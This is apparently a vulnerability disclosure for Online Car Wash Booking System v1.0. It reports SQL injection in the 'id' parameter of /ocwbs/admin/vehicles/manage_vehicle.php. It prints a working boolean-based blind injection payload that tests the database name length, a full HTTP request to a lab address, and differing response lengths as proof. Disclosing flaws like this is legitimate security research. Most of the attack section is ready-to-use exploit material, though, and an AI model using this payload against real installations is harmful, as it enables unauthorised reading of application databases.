# Online Car Wash Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15274/online-car-wash-booking-system-phpoop-free-source-code.html

Vulnerability File: /ocwbs/admin/vehicles/manage_vehicle.php?id=

Vulnerability location: /ocwbs/admin/vehicles/manage_vehicle.php?id=, id

Current database name: ocwbs_db,length is 8

[+] Payload: /ocwbs/admin/vehicles/manage_vehicle.php?id=5%27%20and%20length(database())%20=8--+ // Leak place ---> id

```sql
GET /ocwbs/admin/vehicles/manage_vehicle.php?id=5%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qr1o26kvu55cqqitadqht6jna5
Connection: close
```

When length (database ()) = 7, Content-Length: 1978
![image](https://user-images.githubusercontent.com/54017627/169302391-3f42e531-d93c-4591-9e2e-e6a626325a07.png)

![image](https://user-images.githubusercontent.com/54017627/169302120-abea648f-25f9-46d4-af00-3ed9b78fa270.png)

When length (database ()) = 8, Content-Length: 1997
![image](https://user-images.githubusercontent.com/54017627/169302437-2957a931-9408-4616-8a43-7915be3148b7.png)

![image](https://user-images.githubusercontent.com/54017627/169302063-a05d56ce-daa9-4a25-af02-5d16a9c1f69c.png)
